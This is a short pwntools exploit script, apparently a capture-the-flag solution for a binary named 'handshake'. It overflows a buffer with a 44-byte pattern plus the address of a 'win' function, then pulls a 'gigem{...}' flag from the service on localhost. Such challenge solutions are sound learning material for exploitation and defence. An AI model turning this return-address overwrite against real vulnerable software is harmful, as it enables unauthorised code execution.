from pwn import *
import re

elf = ELF("./handshake")

# p = process("./handshake")
p = remote('localhost', 4212)
p.sendline(cyclic(44) + p32(elf.symbols['win']))

print(re.search("gigem{.*}", p.recvall().decode()).group(0))